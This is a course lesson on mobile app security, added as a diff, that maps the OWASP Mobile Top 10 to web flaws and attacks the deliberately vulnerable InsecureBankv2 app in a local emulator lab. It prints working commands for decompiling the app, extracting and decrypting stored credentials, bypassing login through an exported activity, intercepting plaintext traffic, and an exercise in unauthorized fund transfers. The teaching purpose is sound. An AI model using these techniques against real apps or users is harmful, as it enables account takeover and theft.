@@ -1,0 +1,211 @@
+---
+trackId: cybersecurity-ethical-hacking
+tier: 3
+title: "Mobile App Security Basics"
+order: 5
+estimatedHours: 13
+slug: mobile-app-security-basics
+---
+
+## The OWASP Mobile Top 10, Mapped to What You Already Know
+
+You already carry the OWASP Top 10 (web) 2021 in your head from Tier 1-2. The Mobile Top 10 (2024 revision) isn't a different discipline — it's the same handful of failure classes reappearing on a platform where the attacker holds the client binary and, usually, the physical device:
+
+| Mobile Top 10 | Web Top 10 analog | What's actually different on mobile |
+|---|---|---|
+| M1 Improper Credential Usage | A07 Identification & Auth Failures | Hardcoded API keys/tokens baked into a binary anyone can download and decompile |
+| M2 Inadequate Supply Chain Security | A06 Vulnerable/Outdated Components | Same idea, applied to SDKs, ad libraries, and signing keys instead of server-side packages |
+| M3 Insecure Authentication/Authorization | A07 | Session logic gets re-implemented client-side because there's no browser enforcing it |
+| M4 Insufficient Input/Output Validation | A03 Injection | Deep links, inter-process communication (Intents), and WebView bridges are injection surfaces a web app never has |
+| M5 Insecure Communication | A02 Cryptographic Failures | Same TLS failures you already found with Wireshark — now add certificate pinning and WebView-specific TLS quirks |
+| M6 Inadequate Privacy Controls | (no clean web analog) | Apps request camera/location/contacts; over-broad permission use is a mobile-only failure mode |
+| M7 Insufficient Binary Protections | (no web analog) | The "client" is a static file an attacker can fully decompile offline — a web app's client logic is never shipped this way |
+| M8 Security Misconfiguration | A05 Security Misconfiguration | Exported Activities/Services/Receivers/Providers are Android's version of an open admin endpoint |
+| M9 Insecure Data Storage | A02 / A05 | The threat model includes physical device possession, not just network access |
+| M10 Insufficient Cryptography | A02 Cryptographic Failures | Same mistakes — ECB mode, static keys — but now embedded in a binary instead of a server you can't read |
+
+M7 and M9 exist *because* the client ships to the attacker. That's the genuinely mobile-specific mindset shift: on web, you only ever observe the server's behavior through its outputs. On mobile, the moment you install the APK you own a full copy of the client — keys, logic, and all.
+
+Everything below runs against **OWASP InsecureBankv2**, OWASP's own deliberately vulnerable Android banking app, inside your own emulator, talking to its own bundled backend server. Nothing here touches anyone else's app, account, or device.
+
+## Lab Setup: InsecureBankv2 on Your Emulator
+
+Pull OWASP's repo — it ships both the APK and the backend it expects to talk to:
+
+```bash
+git clone https://github.com/dineshshetty/Insecure-BankV2.git
+cd Insecure-BankV2
+ls
+# InsecureBankv2  InsecureBankv2Server  README.md
+```
+
+The prebuilt APK is already in the repo (`AndroInsecureBankv2.apk`) — you don't need Android Studio to build it, only to run an emulator. Create an AVD running API 28-ish; this app targets an old SDK and behaves oddly on anything running Android 10+'s scoped storage changes:
+
+```bash
+avdmanager create avd -n ibank-lab -k "system-images;android-28;google_apis;x86_64"
+emulator -avd ibank-lab &
+adb wait-for-device
+adb install Insecure-BankV2/InsecureBankv2/AndroInsecureBankv2.apk
+```
+
+Start the Python backend the app authenticates against:
+
+```bash
+cd Insecure-BankV2/InsecureBankv2Server
+python2 server.py
+# Server listening on 0.0.0.0:8888
+```
+
+Open the app, go to its settings menu, and point the server address at `10.0.2.2:8888` — the AVD's fixed alias for your host machine's loopback interface. Log in with a seeded account (`dinesh` / `Dinesh@123$`) to confirm the lab is wired up correctly before you start attacking it. Keep `adb logcat | grep -i insecurebank` running in a second terminal for the rest of this module — several of the bugs below announce themselves there before you even go looking.
+
+## Static Analysis: apktool and jadx
+
+Two decompilers, two different jobs.
+
+```bash
+apktool d Insecure-BankV2/InsecureBankv2/AndroInsecureBankv2.apk -o ibank_apktool
+```
+
+`apktool` reconstructs a readable `AndroidManifest.xml` and the raw `res/` tree — the fastest way to audit permissions and component declarations without reading a single line of app logic:
+
+```bash
+grep -B2 -A2 "PostLogin\|allowBackup\|debuggable" ibank_apktool/AndroidManifest.xml
+```
+
+```xml
+<application android:allowBackup="true" android:debuggable="true" ...>
+    <activity android:name="com.android.insecurebankv2.PostLogin"
+        android:configChanges="orientation|keyboardHidden"
+        android:exported="true"
+        android:label="@string/title_activity_post_login"/>
+```
+
+Three findings in one grep: `allowBackup="true"` means you can pull the app's private data with `adb backup` even without root; `debuggable="true"` means `run-as` works for the same purpose; and `exported="true"` on an activity that has nothing to do with being a launcher is an authentication bypass waiting to be triggered.
+
+For actual source, use jadx — it reconstructs Java-like class bodies from DEX bytecode instead of smali:
+
+```bash
+jadx -d ibank_jadx Insecure-BankV2/InsecureBankv2/AndroInsecureBankv2.apk
+# or interactively: jadx-gui AndroInsecureBankv2.apk
+```
+
+Open `ibank_jadx/sources/com/android/insecurebankv2/CryptoClass.java`. This is where M9 and M10 stop being theory.
+
+## Insecure Data Storage (M9): Decrypting the "Encrypted" Password
+
+`CryptoClass.java` is the app's home-grown encryption for anything it caches locally — and the key is sitting in the decompiled source in plain sight:
+
+```java
+public class CryptoClass {
+    public String aesEncryptedString(String input) throws Exception {
+        byte[] secretKeyBytes = "This is the super secret key".getBytes("UTF-8");
+        SecretKeySpec secretKey = new SecretKeySpec(secretKeyBytes, "AES");
+        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
+        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
+        return Base64.encodeToString(cipher.doFinal(input.getBytes("UTF-8")), 0);
+    }
+}
+```
+
+Two bugs stacked in four lines: a static key hardcoded into every copy of this APK, and ECB mode, which leaks repeating plaintext structure even before you touch the key. Confirm the exact literal in your own decompile — minor build revisions vary — then go find what it actually protects.
+
+Pull the app's shared preferences, using `run-as` since you already confirmed `debuggable="true"`:
+
+```bash
+adb shell run-as com.android.insecurebankv2 \
+  cat /data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml
+```
+
+```xml
+<?xml version='1.0' encoding='utf-8' standalone='yes'?>
+<map>
+    <string name="EncryptedUsername">RmFjPorzWJjM...</string>
+    <string name="EncryptedPassword">yK1sDkk3RZq2...</string>
+</map>
+```
+
+Decrypt it with the key you pulled from `CryptoClass.java`:
+
+```python
+from Crypto.Cipher import AES
+import base64
+
+key = b"This is the super secret key"[:16]   # AES-128 block, truncated to 16 bytes
+ct = base64.b64decode("yK1sDkk3RZq2...")
+cipher = AES.new(key, AES.MODE_ECB)
+print(cipher.decrypt(ct))
+```
+
+That recovers the plaintext password you typed at login. The "encryption" bought the app nothing, because the key never left the binary you're holding. While you're in there, dump the local database too:
+
+```bash
+adb shell run-as com.android.insecurebankv2 \
+  sqlite3 /data/data/com.android.insecurebankv2/databases/myDB ".dump" > myDB.sql
+less myDB.sql
+```
+
+Look for the cached security question/answer pair InsecureBankv2's "forgot password" flow stores — unencrypted, for exactly this exercise.
+
+If `run-as` ever refuses you (say, on a stock image without `debuggable`), fall back to the `allowBackup` flag you already confirmed:
+
+```bash
+adb backup -nocompress com.android.insecurebankv2 -f ibank.ab
+dd if=ibank.ab bs=1 skip=24 | python3 -c "import sys,zlib; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar xvf -
+```
+
+That unpacks the same `shared_prefs/` and `databases/` directories into a local tarball — no root, no `run-as`, just a misconfigured manifest flag.
+
+## Weak Platform-API Usage (M8): Exported Activities and WebView
+
+You already have the manifest line for `PostLogin`. An exported activity whose `onCreate()` does no session check is an authentication bypass you can trigger with nothing but `adb`:
+
+```bash
+adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin \
+  -e usrname dinesh
+```
+
+That drops you straight into `dinesh`'s logged-in account screen — no password, no session token — because `PostLogin` trusts whatever username arrives as an Intent extra and renders that user's data on faith. This is Android's version of an unauthenticated admin endpoint: the "network" here is Binder IPC between components instead of HTTP, and the broken access control underneath is the same shape as A01 on the web, just reached through `am start` instead of `curl`.
+
+The second platform-API misuse lives in `ViewStatement.java`:
+
+```java
+WebView wv = (WebView) findViewById(R.id.webView1);
+wv.getSettings().setJavaScriptEnabled(true);
+wv.addJavascriptInterface(new JavaScriptInterface(this), "Android");
+wv.loadUrl("file:///android_asset/statement.html");
+```
+
+`setJavaScriptEnabled(true)` paired with `addJavascriptInterface` is a standing invitation: any script that ends up running inside that WebView gets a callable bridge straight into Java methods on the host app. On the web this class of bug is "XSS"; on Android the payoff is worse, because the bridged interface can reach native app internals no `<script>` tag in a browser sandbox ever could. Decompile `JavaScriptInterface.java` yourself with jadx and enumerate exactly which `@JavascriptInterface`-annotated methods that bridge exposes — that list is the actual attack surface, not the WebView itself.
+
+## Insecure Communication (M5): Burp as the Emulator's Proxy
+
+You already proved, with Wireshark, that unencrypted HTTP leaks credentials on the wire. Reproduce that proof from the application's own vantage point, with Burp sitting where Wireshark used to.
+
+Point the AVD's traffic at Burp:
+
+```bash
+adb shell settings put global http_proxy 10.0.2.2:8080
+```
+
+Start Burp listening on `127.0.0.1:8080` with Proxy intercept on. (For HTTPS traffic you'd also drag Burp's CA certificate onto the emulator and install it under Settings → Security → Install from storage — InsecureBankv2's backend doesn't even bother with TLS, which is exactly the point here.) Log in from the app again and read the request straight out of Burp's HTTP history:
+
+```text
+POST /login HTTP/1.1
+Host: 10.0.2.2:8888
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+username=dinesh&password=Dinesh%40123%24
+```
+
+Plaintext credentials in a POST body — exactly as readable as the HTTP Basic-Auth header you pulled out of a raw packet capture back in the networking module. The only difference is which tool sits in the path: a proxy like Burp hands you the request with full application context (headers, parameters, one-click replay in Repeater), while a packet capture hands you the raw bytes off the wire. Both are reporting the same underlying finding — this traffic needed TLS and shipped without it, and even with TLS, this app pins no certificate, so a proxy in the middle would still see everything.
+
+Send that captured request to Repeater and tamper with the password field. The server's response — same error format whether the username doesn't exist or the password is wrong, or not — is itself a finding worth a line in your report: verbose or inconsistent auth-failure responses make credential-stuffing against this backend trivially easy to automate.
+
+## Exercise
+
+Using only `adb` and jadx against your own InsecureBankv2 install, find the exported `DoTransfer` activity, decompile it, and work out the exact Intent extras it expects. Then launch it directly with `am start` and move funds between two of the app's seeded accounts without ever submitting valid login credentials — chaining the same exported-component bypass you used on `PostLogin` into an unauthorized transaction instead of just an unauthorized view.
+
+Hint: `DoTransfer.java`'s `onCreate()` reads several `getIntent().getStringExtra("...")` calls before it populates the transfer form — those literal strings are your required `-e key value` pairs. Check which account names actually exist by re-reading the `myDB` dump you produced earlier before you pick a target account to drain.
+
+Document this one the way you'll document everything in Tier 3: the exact `adb` command, the manifest line that made it possible, and the CVSS-style impact statement — broken access control leading to unauthorized funds transfer — that belongs in a finding writeup.
